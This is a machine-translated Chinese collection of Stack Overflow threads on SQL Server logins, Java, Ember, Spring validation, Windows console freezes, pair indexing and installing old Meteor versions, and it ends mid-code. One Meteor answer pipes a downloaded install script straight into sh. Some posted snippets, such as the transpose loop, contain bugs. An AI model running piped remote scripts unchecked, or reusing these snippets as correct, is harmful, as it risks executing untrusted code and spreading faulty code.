`Security > Logins`我可以在和中看到这些组`(database) > Security > Users`。

问题是一些数据库有 50 多个这样的 AD 组作为有效的登录名/用户，我知道我是不止一个的成员。

有没有办法可以确定我在哪些 AD 组下登录？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-28T07:20:31.977

您实际上已以所有人的身份登录。您将拥有授予您所属的每个组的所有个人权限的联合。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-10T03:52:12.077

有 2 个直接的内置命令可以帮助您找到所需的内容：

首先，扩展过程 XP_LoginInfo（至少从 SS2000 开始可用）将向您显示允许特定登录名用于连接到实例的所有连接路径

```
DECLARE @LoginName sysname
SELECT @LoginName = SYSTEM_USER

EXEC xp_LoginInfo @AcctName = @LoginName, @Option = 'all' 
```

最后一列“权限路径”下显示的所有组名都是提供的 LoginName 所属的组。还要注意“特权”栏；它将显示登录名在实例上是否具有**管理员**或**用户级别的权限。**

现在，函数 fn_my_permissions（自 SS2005 起可用）将显示*当前连接的登录*在**当前数据库**或**服务器**上的所有权限。

```
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');

SELECT * FROM fn_my_permissions(NULL, 'SERVER'); 
```

正如 Damien_The_Unbeliever 在 2012 年 11 月 28 日回应的那样，基本上最终的权限列表是所有分配给每个组（以及已明确添加 ID 的单独）*权限路径*的所有权限的联合 - 授予和拒绝 -您看到通过执行 xp_LoginInfo。

所以答案基本上是当有多个允许的路径时，您不会与任何一个组完全连接。相反，从本质上讲，你与他们所有人联系在一起。虽然 SQL Server 没有任何地方清楚地显示甚至声明权限的“联合”性质，但可以通过上述 2 个命令推断出。

可以在[此处的 MSDN 上找到大量有用的安全目录视图。](http://msdn.microsoft.com/en-us/library/ms178542%28v=sql.100%29.aspx)

# windows-8 - Win8 和 Cilk++

> ID：13599806
> 
> 赞同：0
> 
> 时间：2012-11-28T07:18:45.737
> 
> 标签：windows-8, cilk-plus

我愿意为 IntelAppUp 商店创建一个应用程序。我遇到了 Cilk++。我想知道在构建基于表单的应用程序时如何在 C# 应用程序中使用这个 C++ 库？任何见解都会有所帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-11T21:51:23.900

Cilk++ 不受支持。它已被英特尔® Cilk ^™ Plus 取代，后者已由英特尔 Composer XE C++ 编译器（Composer XE 2011 或更高版本）以及 GCC 的“cilkplus”分支实现。

您需要小心混合 Cilk Plus 和 C# 表单。Cilk Plus 提供了一种易于使用的 fork/join 并行机制。在并行区域内，无法预测一段代码将在哪个线程上运行。您需要了解 C# 表单和线程应用程序的局限性。[关于这里问题的一个很好的入门文章是http://msdn.microsoft.com/en-us/library/ms951089.aspx](http://msdn.microsoft.com/en-us/library/ms951089.aspx)上提供的文章“Windows 窗体中的安全、简单的多线程” 。您还可以查看 Composer XE for Windows 附带的 QuickDemo 示例。诚然，QuickDemo 是一个基于 MFC 而不是 WinForms 的应用程序，但它演示了许多相同的问题。

```
- Barry Tannenbaum
  Intel Cilk Plus Runtime Development 
```

# java - 如何通过一条语句将二维数组划分为一维数组？

> ID：13599807
> 
> 赞同：1
> 
> 时间：2012-11-28T07:18:46.850
> 
> 标签：java, arrays

如果我有：

```
int[] a = {1,2,3,4,5};
int[] b = {5,7,8,9};
int[][] array2d ={a,b}; 
```

我可以通过以下方式将 array2d 划分为 2 个 1d 数组：

```
int[] A = new int[array2d[0].length];
int[] B = new int[array2d[1].length];
for(int i = 0; i < array2d.lenght; i++){
   A[i] = array2d[i][0];
   B[i] = array2d[i][1];
} 
```

但是可以通过一个语句来完成吗？

例如，如果我有：

```
int[][] array2dx = new int[2][1000]; 
```

我可以做的很简单：

```
int[] Ax = array2dx[0];
int[] Bx = array2dy[1]; 
```

所以我正在寻找类似的东西（分成2个数组）`array int[1000][2];`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:26:21.797

> 但是可以通过一个语句来完成吗？

不是我知道的任何内置方法。听起来你基本上想写一个转置方法：

```
 static int[][] transpose(int[][] input) {
     // TODO: Validation. Detect empty and non-rectangular arrays.
     int[][] ret = new int[input[0].length][];
     for (int i = 0; i < ret.length; i++) {
        ret[i] = new int[input.length];
     }
     for (int i = 0; i < input.length; i++) {
         for (int j = 0; i < ret.length; j++) {
             ret[j][i] = input[i][j];
         }
     }
     return ret;
 } 
```

将 an 转置`int[1000][2]`为 an后，`int[2][1000]`您可以简单地取出两个`int[1000]`数组，正如您已经展示的那样。

# ember.js - Ember.js connectOutlets 在创建路由器的那一刻在 root 上运行

> ID：13599810
> 
> 赞同：1
> 
> 时间：2012-11-28T07:19:06.377
> 
> 标签：ember.js

我有以下 ember 路由器定义：

```
WZ.Router = Em.Router.extend
  enableLogging: true
  location: 'hash'
  showHome: Ember.Route.transitionTo 'root.index'
  root: Em.Route.extend
    initialState: 'index'
    connectOutlets: (router, event) ->
      unless router.get 'initialized'
        router.get('applicationController').connectOutlet 'nav', 'navbar'
        router.get('homeController').connectOutlet 'bottombar', 'bottombar'
        router.set 'initialized', true

    index: Em.Route.extend
      route: '/'
      connectOutlets: (router, event) ->
        router.get('applicationController').connectOutlet 'home' 
```

我正在使用根路由的 connectOutlets，因为无论用户输入应用程序的哪个 url，我都希望连接导航出口。

问题是，一旦创建了路由器，根 connectOutlets 就会触发，这是在路由器通过 runInjections 注入控制器之前。

如果我将这些插座连接到叶子路由中，一切都会正常工作，但这不是我所追求的。

如果我无法使用 root connectOutlets，无论用户在哪个 url 或路由上输入应用程序，我如何才能最好地确保导航插座已连接？

我们是否也应该禁止在叶路由上覆盖 connectOutlets，因为如果没有控制器等连接它是相当无用的？

**编辑：**我通过使用 Ember.run.next 解决了这个问题：

```
WZ.Router = Em.Router.extend
  enableLogging: true
  location: 'hash'
  showHome: Ember.Route.transitionTo 'root.index'
  root: Em.Route.extend
    connectOutlets: (router, event) ->
      Ember.run.next @, ->
        unless router.get 'initialized'
          router.get('applicationController').connectOutlet 'nav', 'navbar'
          router.get('homeController').connectOutlet 'bottombar', 'bottombar'
          router.set 'initialized', true
    index: Em.Route.extend
      route: '/' 
```

但这似乎仍然不太理想。这是 Em 逻辑中的一个漏洞还是有意设计的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T15:04:15.773

我一般认为根状态是特殊的，所以我不使用connectOutlets这个状态。在实践中，这意味着根状态（响应 URL '/'）重定向到“家”状态，我将在其中放置您的 connectOutlets。

这样做的好处是您不会遇到控制器未注入的问题，但这也意味着如果不使用 History API，您的“默认” URL 将变为 yoursite.com/#/home 之类的东西，并且yoursite.com/home 如果你是。

在这两种情况下都不是很理想，但至少你没有将 Ember.run.next 硬塞到你的 connectOutlets 中，这似乎是一种糟糕的形式，可能会带来一系列其他问题。我想你不会，但你现在期望你的控制器将在现在和下一个运行循环触发之间被注入......这可能是也可能不是......

# javascript - 带有颜色框的 jQuery Mobile Select Dropbox

> ID：13599815
> 
> 赞同：0
> 
> 时间：2012-11-28T07:19:19.450
> 
> 标签：javascript, jquery, html, forms, jquery-mobile

我想知道是否可以创建如下选择控件？

![在此处输入图像描述](../Images/ff2e73b0386fc1898c04d21396e04469.png)

我尝试了类似下面的方法，但它并没有在里面推一个框，而是为整个下拉列表着色。并且选择所选颜色后未显示在列表中

```
<select name="appCalendar" id="appCalendar">
 <option value="#000000" style="background-color: Black;color: #FFFFFF;">Black</option>
 <option value="#808080" style="background-color: Gray;">Gray</option>
 <option value="#A9A9A9" style="background-color: DarkGray;">DarkGray</option>
 <option value="#FF0000" style="background-color: Red;">Red</option>
 <option value="#A52A2A" style="background-color: Brown;">Brown</option>
 <option value="#DEB887" style="background-color: BurlyWood;">BurlyWood</option>
 <option value="#F5F5DC" style="background-color: Beige;">Beige</option>
</select> 
```

提前感谢您的时间。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:25:32.603

不使用背景颜色。我认为在这种情况下唯一的方法是使用一些 javascript-plugin 来制作自定义元素并使用底层选择。

例如这个：[http ://designwithpc.com/Plugins/ddSlick](http://designwithpc.com/Plugins/ddSlick)

# scripting - 如何在 ps 脚本中打开文件/浏览对话框以选择 .bak 文件并获取所选 .bak 文件的文件路径

> ID：13599816
> 
> 赞同：1
> 
> 时间：2012-11-28T07:19:21.680
> 
> 标签：scripting

我想为 .bak 文件选择打开一个文件/浏览对话框，以便用户可以浏览到它的 .bak 文件，然后我想检索用户选择的 .bak 文件的文件路径。

我对 PS SCRIPT 很陌生。如何在 ps 脚本中实现上述任务

# java - Autowired Repository 在自定义约束验证器中为 Null

> ID：13599821
> 
> 赞同：6
> 
> 时间：2012-11-28T07:19:46.773
> 
> 标签：java, spring, hibernate, validation, bean-validation

我有一个基于 Spring 的 webapp。我在我的控制器中使用了几个带有注释@Repository、@Transactional 的存储库类。那部分工作正常。

我创建了一个必须访问存储库的自定义约束验证器。现在我无法理解为什么存储库为空。我尝试使用 @Component 注释来注释验证器。我的包含所有这些类的基础包位于 xml 的一部分。那么我还应该做些什么来确保存储库依赖注入有效。这就是我的约束验证器的样子。

```
public class DonorTypeExistsConstraintValidator implements
    ConstraintValidator<DonorTypeExists, DonorType> {

  @Autowired
  private DonorTypeRepository donorTypeRepository;

  @Override
  public void initialize(DonorTypeExists constraint) {

  }

  public boolean isValid(DonorType target, ConstraintValidatorContext context) {

   System.out.println("donorType: " + target);
   if (target == null)
     return true;

   try {
    if (donorTypeRepository.isDonorTypeValid(target.getDonorType()))
     return true;
   } catch (Exception e) {
    e.printStackTrace();
   }
   return false;
  }

  public void setDonorRepository(DonorTypeRepository donorTypeRepository) {
    this.donorTypeRepository = donorTypeRepository;
  }
} 
```

**更新**

包扫描配置：

```
<context:annotation-config />

<!-- Configures the @Controller programming model -->
<mvc:annotation-driven />

<context:component-scan base-package="controller" />
<context:component-scan base-package="repository" />
<context:component-scan base-package="model" />
<context:component-scan base-package="viewmodel" /> 
```

这个类在包model.donortype中。存储库位于包存储库中。

**更新**

更令人费解的是，删除所有预插入侦听器（在这种情况下只有 BeanValidationEventListener）修复了自动装配问题。这让事情变得更加复杂。

我什至没有按照下面的答案中所述插入 BeanValidationEventListener 。这实际上与这里的建议相反： [JSR-303 dependency injection and Hibernate](https://stackoverflow.com/questions/2712345/jsr-303-dependency-injection-and-hibernate)

```
 @Override
  public void integrate(Configuration configuration, SessionFactoryImplementor implementor,
                        SessionFactoryServiceRegistry registry) {
      logger.info("Registering event listeners");
      System.out.println("here");
      // you can add duplication strategory for duplicate registrations

      final EventListenerRegistry eventRegistry = registry.getService(EventListenerRegistry.class);
      // prepend to register before or append to register after
      // this example will register a persist event listener

      eventRegistry.prependListeners(EventType.PERSIST, EntitySaveListener.class);
      eventRegistry.appendListeners(EventType.MERGE, EntitySaveListener.class);
      Iterator<PreInsertEventListener> iter = eventRegistry.getEventListenerGroup(EventType.PRE_INSERT).listeners().iterator();
      while (iter.hasNext()) {
        PreInsertEventListener el = iter.next();
        System.out.println(el.getClass());
        BeanValidationEventListener listener = (BeanValidationEventListener) el;
        System.out.println(listener);
        iter.remove();
      }
  } 
```

**更新**

我正在使用 JPA。我有 JPA 实体的支持表格。在控制器中，我使用 InitBinder 来实例化自定义验证器`binder.setValidator(new EntityBackingFormValidator(binder.getValidator()));`。这是代码： [https ://github.com/C4G/V2V/blob/87dc266043f6d623c101d947a88fa0b0ad536355/src/controller/CollectedSampleController.java](https://github.com/C4G/V2V/blob/87dc266043f6d623c101d947a88fa0b0ad536355/src/controller/CollectedSampleController.java)

此自定义验证器调用默认验证器上的验证，并保留执行一些自定义验证的范围。 [https://github.com/C4G/V2V/blob/87dc266043f6d623c101d947a88fa0b0ad536355/src/model/collectedsample/CollectedSampleBackingFormValidator.java](https://github.com/C4G/V2V/blob/87dc266043f6d623c101d947a88fa0b0ad536355/src/model/collectedsample/CollectedSampleBackingFormValidator.java)

我在实体中使用注释来创建约束。除了默认约束之外，我还需要定义约束来检查多对一映射另一侧的实体是否存在。这是自定义约束验证器。 [https://github.com/C4G/V2V/blob/87dc266043f6d623c101d947a88fa0b0ad536355/src/model/donor/DonorExistsConstraintValidator.java](https://github.com/C4G/V2V/blob/87dc266043f6d623c101d947a88fa0b0ad536355/src/model/donor/DonorExistsConstraintValidator.java)

现在，此自定义约束验证器中的自动装配存储库为空。我正在尝试在我的 CustomIntegrator 中自定义代码，该代码位于此处 [https://github.com/C4G/V2V/blob/87dc266043f6d623c101d947a88fa0b0ad536355/src/interceptor/CustomIntegrator.java](https://github.com/C4G/V2V/blob/87dc266043f6d623c101d947a88fa0b0ad536355/src/interceptor/CustomIntegrator.java)

以及此处提供的 xml 配置文件 [https://github.com/C4G/V2V/blob/87dc266043f6d623c101d947a88fa0b0ad536355/war/WEB-INF/v2v-servlet.xml](https://github.com/C4G/V2V/blob/87dc266043f6d623c101d947a88fa0b0ad536355/war/WEB-INF/v2v-servlet.xml)

希望实际代码能帮助您回答我的问题。谢谢！

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-29T07:35:19.637

您使用的是哪个*ValidatorFactory 。*或者换一种说法，引导 Bean Validation 对你来说很热门？默认的 Bean Validation（以及作为参考实现的 Hibernate Validator）不会将依赖项注入到*ConstraintValidator*实例中。至少在 Bean Validation 1.0 中。

要启用依赖注入，您必须配置自定义*ConstraintValidatorFactory*。Spring 提供*SpringConstraintValidatorFactory*，这是使用*LocalValidatorFactoryBean*时的默认设置- 请参阅[http://static.springsource.org/spring/docs/3.0.0.RC3/reference/html/ch05s07.html](http://static.springsource.org/spring/docs/3.0.0.RC3/reference/html/ch05s07.html)

另外，您使用JPA吗？我假设是这样，在这种情况下会自动对生命周期事件进行自动验证。*您可以使用属性javax.persistence.validation.mode*并将其设置为 NONE，而不是尝试删除事件侦听器。我想知道是否在基于生命周期的验证中使用了正确的验证器。

这完全取决于您的整体 Spring 配置和使用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-08T16:46:38.250

执行验证时是否传递了 JPA 使用的验证器工厂：

```
<bean 
    id="entityManagerFactory" 
    class="org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean">
    <property name="jpaPropertyMap">
        <map>
            <entry 
                key="javax.persistence.validation.factory"
                value-ref="validator"/>
            <!-- ... -->
        </map>
    </property>
    <!-- ... -->
</bean> 
```

这是必需的，否则JPA 将使用默认工厂（在*validation.xml中指定）。*

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-07T22:24:26.273

DonorTypeExistsConstraintValidator 上有 @Component 注释吗？

这在过去杀死了我。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-12-22T05:34:46.633

LocalValidatorFactoryBean 没有运气。我做了一些破解来解决这个问题。

```
@Component
public class ServiceUtils
{
    private static ServiceUtils instance;

    @Autowired
    private ListableBeanFactory factory;

    @PostConstruct
    public void init()
    {
        instance = this;
    }

    public static ListableBeanFactory getFactory()
    {
        return instance.factory;
    }
} 
```

# windows - 命令提示符卡住并继续按 Enter 键

> ID：13599822
> 
> 赞同：17
> 
> 时间：2012-11-28T07:19:49.253
> 
> 标签：windows, cmd, console

当命令提示符正在运行一个进程然后它被卡住并且进程也在休眠时，是否有人遇到过这种情况。然后，当我们`Enter`在 cmd 窗口中按下键时，该过程继续进行。

有没有办法避免这种情况？或者这可以处理吗？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2020-06-03T03:06:27.127

其他答案都是错误的！Windows 控制台有一个单独的模式，称为“标记模式”，用于选择文本。在该模式下，屏幕将被冻结，文本将进入缓冲区，如果缓冲区已满，则正在运行的进程将被阻止

[![标记模式](../Images/b2d77d8800e57fd149fd749be65cffbe.png)](https://i.stack.imgur.com/T2J9D.png)

如果启用了快速编辑模式（默认情况下它[在旧版 Windows 中被禁用](https://devblogs.microsoft.com/oldnewthing/20070913-00/?p=25143)但[在 Windows 10 中启用](https://www.techrepublic.com/article/take-a-look-at-windows-10s-new-command-prompt-features/)）然后在控制台窗口内单击将激活标记模式并导致您观察到的结果

很容易意外单击控制台并停止命令。当您按下`Enter`或时`Esc`，所选文本将被复制到剪贴板并退出标记模式，因此该过程将再次运行。**优先级在这里绝对无关紧要，**因为如果缓冲区已满，那么无论优先级如何，进程都会永远阻塞，直到您退出标记模式。当有一些输入时，控制台不会更改优先级。尝试以最高优先级打开一个输出大量数据的应用程序，然后点击控制台，即使CPU处于空闲状态，该应用程序仍然会无限期阻塞

以下是 Windows 8 控制台中 QuickEdit 模式设置的示例：

[![命令](../Images/9cd3114474a221cc341d88721ce8a436.png)](https://i.stack.imgur.com/rw4r0.jpg)

要解决此问题，您可以在不需要时**禁用快速编辑模式。**在这种情况下，复制会比较麻烦，因为您必须打开上下文菜单，选择*Edit > Mark*。如果您正在编写自己的控制台应用程序`ENABLE_QUICK_EDIT_MODE`，您还可以通过设置禁用 QuickEdit 模式[`SetConsoleMode()`](https://docs.microsoft.com/en-us/windows/console/setconsolemode)

# 也可以看看

*   [命令提示符中的快速编辑模式如何以及为什么会冻结应用程序？](https://stackoverflow.com/q/30418886/995714)
*   [如果我在 cmd 的窗口中单击，它究竟做了什么？](https://superuser.com/q/459609/241386)
*   [从我的应用程序中关闭 Windows 10 控制台“标记”模式](https://stackoverflow.com/q/41409727/995714)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-02T18:25:04.247

如果其他进程正在占用所有周期并且具有更高的优先级，那么您的进程可能会停止。用户输入可能只是给它一个 prio 提升，所以它重新开始。有关详细信息，请参阅[https://docs.microsoft.com/en-us/windows/win32/procthread/priority-boosts](https://docs.microsoft.com/en-us/windows/win32/procthread/priority-boosts)上的Microsoft Docs 。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-10-05T05:53:05.700

今天在执行包含 TFSBuild 的批处理文件时发生在我身上。我已经收到了来自 TFSBuild 的电子邮件通知它是成功的，但是不知何故批处理文件没有进入下一行。

我等了1个小时。我按下了 Enter 键、Mark for Edit 等，但这些都不起作用。然后我点击`Ctrl+C`尝试终止批处理文件。当被问及是否要终止时，我输入了`N`. 奇怪的是，批处理文件在那之后继续。

# android - 如何给出本地图片文件的url

> ID：13599828
> 
> 赞同：-3
> 
> 时间：2012-11-28T07:19:58.347
> 
> 标签：android

> **可能重复：**
> [如何从资产文件中获取 URI？](https://stackoverflow.com/questions/4820816/how-to-get-uri-from-an-asset-file)

我的资产文件夹 bill.png 中有一张图片我如何提供该文件的网址？如何通过 url 访问该文件？

我该怎么办？给出文件的 url，而不是 http url

```
 GeoPoint point2 = new GeoPoint((int)(51.515259*1E6),(int)(-0.086623*1E6));
    CustomOverlayItem overlayItem2 = new CustomOverlayItem(point2, "GoldenEye  
 (1995)", 
            "(Interiors Russian defence ministry council chambers in  
 St Petersburg)", 
            "http://ia.media-imdb.com/images 

  BMzk2OTg4MTk1NF5BMl5BanBnXkFtZTcwNjExNTgzNA@@._V1._SX40_CR0,0,40,54_.jpg");       
    itemizedOverlay.addOverlay(overlayItem2);

    mapOverlays.add(itemizedOverlay); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:30:01.433

看到这个链接。有资产属性。`getBitmapFromAsset().`您可以获取图像并在 imageview 中设置。

[在 Android 中，我可以在布局 xml 中使用资产中的图像吗？](https://stackoverflow.com/questions/7776445/in-android-can-i-use-image-from-assets-in-layout-xml)

# solr - solr 中使用了什么类型的解析器

> ID：13599835
> 
> 赞同：1
> 
> 时间：2012-11-28T07:20:13.397
> 
> 标签：solr, edismax, dismax

如果我没有在 solr 查询中指定***defType***将使用哪个解析器，是 DisMax 还是 EDisMax ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:25:54.133

在 Solr 1.3 之前，标准请求处理程序将标准查询解析器称为默认查询解析器。在 Solr 1.3 之后的版本中，标准请求处理程序调用 DisMax 查询解析器作为默认查询解析器。

[http://lucidworks.lucidimagination.com/display/solr/The+Standard+Query+Parser](http://lucidworks.lucidimagination.com/display/solr/The+Standard+Query+Parser)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-12-25T16:51:16.067

defType 参数选择 Solr 应该用来处理请求中的主要查询参数 (q) 的查询解析器。例如：defType=dismax

根据 solr 6.6，如果未指定 defType 参数，则默认使用标准查询解析器。（例如：defType=lucene）

[在什么是 solr 的默认查询解析器](https://stackoverflow.com/questions/23115781/what-is-solrs-default-query-parser/47947661)中也提出了同样的问题

参考：[https ://lucene.apache.org/solr/guide/6_6/common-query-parameters.html](https://lucene.apache.org/solr/guide/6_6/common-query-parameters.html)

# c++ - 非冗余对列表中对象的索引

> ID：13599842
> 
> 赞同：1
> 
> 时间：2012-11-28T07:20:39.630
> 
> 标签：c++, math, collision-detection

我正在实现一个碰撞检测算法，将所有对象之间的距离存储在一个八叉树节点中。例如，如果节点中有 4 个对象，则对象 1&2、1&3、1&4、2&3、2&4 和 3&4 之间存在距离。对总数的公式是 t = n * (n-1) / 2，其中 t 是对的总数，n 是节点中的对象数。

我的问题是，如何从列表中的位置转换为一对对象。例如，使用上面的对列表，3 将返回对 2&3。

为了节省内存空间，该列表只是距离的浮点列表，而不是包含距离和指向 2 个对象的指针。

我不确定如何在数学上将单个列表索引转换为一对数字。任何帮助都会很棒。我希望能够将其分解为 2 个函数，第一个返回对中的第一个对象，第二个返回第二个，这两个函数都采用 2 个变量，一个是索引，另一个是总对象节点。如果可能的话，我想创建一个没有任何循环或具有递归函数的函数，因为这将为我的碰撞检测算法实时运行。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-28T08:20:38.257

# 更好的订购

我建议使用[colexicographical order](http://en.wikipedia.org/wiki/Colexicographical_order)，因为在这种情况下您不必提供对象的总数。像这样订购你的配对：

```
 0:   1:   2:   3:   4:   5:   6:   7:   8:   9:  10:  11:  12:  13:  …
0&1, 0&2, 1&2, 0&3, 1&3, 2&3, 0&4, 1&4, 2&4, 3&4, 0&5, 1&5, 2&5, 3&5, … 
```

您将能够将此列表扩展到无限长，因此您可以知道任何对的索引而无需知道项目的数量。这样做的好处是，当您将新项目添加到数据结构中时，您只需要附加到您的数组，而不是重新定位现有条目。当您标记问题 C++ 时，我已将索引调整为从零开始，因此我假设您将使用从零开始的索引。我在下面的所有答案都假定这种顺序。

您还可以像这样可视化 colex 排序：

```
 a: 0  1  2  3  4  5 …
b:
1   0
2   1  2     index of
3   3  4  5       a&b
4   6  7  8  9
5  10 11 12 13 14
6  15 16 17 18 19 20
⋮   ⋮                 ⋱ 
```

# 与单个索引配对

让我们首先将一对转换为单个索引。诀窍在于，对于每一对，您查看第二个位置并想象在该位置具有较少数字的所有对。因此，例如对于`2&4`您首先计算第二个数字小于 4 的所有对的配对。这是从一组 4 中选择两个项目的可能方法的数量（即数字 0 到 3），因此您可以表达这作为二项式系数 4C2。如果你评估它，你最终会得到 4(4−1)/2=6。为此，您添加第一个数字，因为这是具有较低索引但第二位具有相同数字的对数。因为`2&4`这是 2，所以 的总指数`2&4`是 4(4−1)/2+2=8。

通常，对于 a *&* b*对*，索引将为*b* ( *b* -1)/2+ *a*。

```
int index_from_pair(int a, int b) {
  return b*(b - 1)/2 + a;
} 
```

# 单个索引配对

将单个索引*i*变回一对数字的一种方法是增加*b*直到*b* ( *b* +1)/2 > *i ，即**b*的下一个值将导致索引大于*i*的情况。然后你可以找到*a*作为差*a* = *i* -<i>b( *b* -1)/2。这种通过一次增加一个*b*的方法涉及使用循环。

```
pair<int, int> pair_from_index(int i) {
  int a, b;
  for (b = 0; b*(b + 1)/2 <= i; ++b)
    /* empty loop body */;
  a = i - b*(b - 1)/2;
  return make_pair(a, b);
} 
```

您还可以将*b* ( *b* -1)/2 = *i*解释为二次方程，您可以使用平方根来求解。您需要的真正*b*是作为该二次方程的正解得到的浮点*b的底。*由于这种方法中的舍入错误可能会导致您遇到问题，因此您可能需要检查是否*b* ( *b* +1)/2 > *i*。如果不是这种情况，请像在循环方法中那样增加*b 。*一旦有了*b ，* *a*的计算就保持不变。

```
pair<int, int> pair_from_index(int i) {
  int b = (int)floor((sqrt(8*i + 1) + 1)*0.5);
  if (b*(b + 1)/2 <= i) ++b; // handle possible rounding error
  int a = i - b*(b - 1)/2;
  return make_pair(a, b);
} 
```

# 顺序访问

请注意，您只需将索引转回成对即可随机访问您的列表。当迭代所有对时，一组嵌套循环更容易。所以而不是

```
for (int = 0; i < n*(n - 1)/2; ++i) {
  pair<int, int> ab = pair_from_index(i);
  int a = ab.first, b = ab.second;
  // do stuff
} 
```

你最好写

```
for (int i = 0, b = 1; b != n; ++b) {
  for (int a = 0; a != b; ++a) {
    // do stuff
    ++i;
  }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-28T08:43:23.533

根据我对问题的理解，从索引（基于 0，在您的示例中为 3）和对象数量 n（在您的示例中为 4）获取一对 a&b（在您的示例中为 2&3）的一种方法是：

```
t = n * (n - 1) / 2;
a = n - floor((1 + sqrt(1 + 8 * (t - index - 1))) / 2);
b = index + (n - a) * (n - a + 1) / 2 - t + a + 1; 
```

[http://oeis.org/A002024](http://oeis.org/A002024)的一些学分

通用算法（用于元组而不是对）可以在[基于位置](https://stackoverflow.com/questions/5955503/calculate-combination-based-on-position)和[http://saliu.com/bbs/messages/348.html](http://saliu.com/bbs/messages/348.html)的计算组合中找到，但它们似乎涉及循环计算组合。

**编辑：**一个更好的公式（来自同一来源）：

```
a = n - floor(0.5 + sqrt(2 * (t - index))); 
```

# version - 下载旧版本的 Meteor

> ID：13599849
> 
> 赞同：2
> 
> 时间：2012-11-28T07:21:07.740
> 
> 标签：version, meteor

是否可以下载旧版本的流星。

我正在使用的代码（不是我写的）对于 0.34 版是稳定的。它不适用于 0.5。

阿林丹

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-29T08:26:00.027

这不是官方的，但通过分析 install.meteor.com，我发现下载旧版本的 Meteor 很容易。

这是 Mac 版 Meteor 0.3.4 的示例：[https ://d3sqy0vbqsdhku.cloudfront.net/meteor-package-Darwin-x86_64-0.3.4.tar.gz](https://d3sqy0vbqsdhku.cloudfront.net/meteor-package-Darwin-x86_64-0.3.4.tar.gz)

Linux：[https ://d3sqy0vbqsdhku.cloudfront.net/meteor-package-Linux-x86_64-0.3.4.tar.gz](https://d3sqy0vbqsdhku.cloudfront.net/meteor-package-Linux-x86_64-0.3.4.tar.gz)

但我强烈建议您重写您的应用程序以采用最新的 API。如果这不是一个选项，这里是安装旧流星的分步说明（不是官方的！）。

1.  在您的终端类型中：`curl -L http://install.meteor.com > meteor.sh`
2.  在文本编辑器中打开`meteor.sh`并将`VERSION`（*第 #8 行附近*）更改为所需的版本。像这样：

    ```
    URLBASE="https://d3sqy0vbqsdhku.cloudfront.net"
    VERSION="0.3.4"
    PKGVERSION="${VERSION}-1" 
    ```

3.  通过在终端中键入以下内容来安装 Meteor：`sh meteor.sh`

希望这可以帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T01:35:09.340

更简单的方法：使用[陨石](http://oortcloud.github.com/meteorite/)：

在你的`smart.json`

```
"meteor": {
  "git": "https://github.com/meteor/meteor.git",
  "tag": "v0.3.4"
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-04-04T21:27:34.797

我为此找到的解决方案是只安装最新版本并使用`--release`标志运行它。这是假设运行该版本的流星。

`> meteor --release 0.34`

[https://github.com/meteor/meteor/issues/4526](https://github.com/meteor/meteor/issues/4526)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-04-02T15:16:02.120

你可以这样做：

```
curl "https://install.meteor.com/?release=1.3.3.1" | sh 
```

# php - 在 PHP 中获取无限循环

> ID：13599856
> 
> 赞同：1
> 
> 时间：2012-11-28T07:21:58.743
> 
> 标签：php

每当我尝试运行这段代码时，它似乎进入了一个无限循环。但是，我无法弄清楚是什么导致了这个问题。也许对这件事多加注意就能指出问题所在？

该问题仅在存在不同年份区域时才会出现，例如 2012-2018

示例：$this->budget_model->set_monthly_budget('1','2012','8','2014','1');

```
 function set_monthly_budget($start_month, $start_year, $end_month, $end_year, $budget_group_id)
{

    $user_id = 2;

    // Current date
    $current_month = $start_month;
    $current_year = $start_year;
    $days_in_current_month = cal_days_in_month(CAL_GREGORIAN, $current_month, $current_year);
    $company_id = 1;
    $month_goal = 100;

    // Check if it is the current month
    if($start_year == $end_year)
    {

        for($x=$current_month;$x<=$end_month;$x++)
        {

            $data = array(
                'user_id' => $user_id,
                'budget_group_id' => $budget_group_id,
                'month' => $x,
                'year' => $start_year,
                'company_id' => $company_id,
                'month_goal' => $month_goal
            );

            // Inserting information into the database
            $this->db->insert('budget_month',$data);

        }

        return true; // Return true if the task was completed

    }

    if($start_year !== $end_year)
    {

        $temp_start_year = $start_year;

        while($temp_start_year !== $end_year)
        {

            // Check if we are in the same year as we started
            if($temp_start_year == $current_year)
            {

                // Insert remaining months for this year
                for($x=$current_month;$x<=12;$x++)
                {

                    $data = array(
                        'user_id' => $user_id,
                        'budget_group_id' => $budget_group_id,
                        'month' => $x,
                        'year' => $temp_start_year,
                        'company_id' => $company_id,
                        'month_goal' => $month_goal
                    );

                    // Inserting information into the database
                    $this->db->insert('budget_month',$data);

                }

            }

            // Check if the temp and end year is the same
            if($temp_start_year < $end_year)
            {

                // Insert remaining months for this year
                for($x=1;$x<=12;$x++)
                {

                    $data = array(
                        'user_id' => $user_id,
                        'budget_group_id' => $budget_group_id,
                        'month' => $x,
                        'year' => $temp_start_year,
                        'company_id' => $company_id,
                        'month_goal' => $month_goal
                    );

                    // Inserting information into the database
                    $this->db->insert('budget_month',$data);

                }

            }

            // Check if we are in the same year as we started

            if($temp_start_year == $end_year)
            {

                // Insert remaining months for this year
                for($x=1;$x<=$end_month;$x++)
                {

                    $data = array(
                        'user_id' => $user_id,
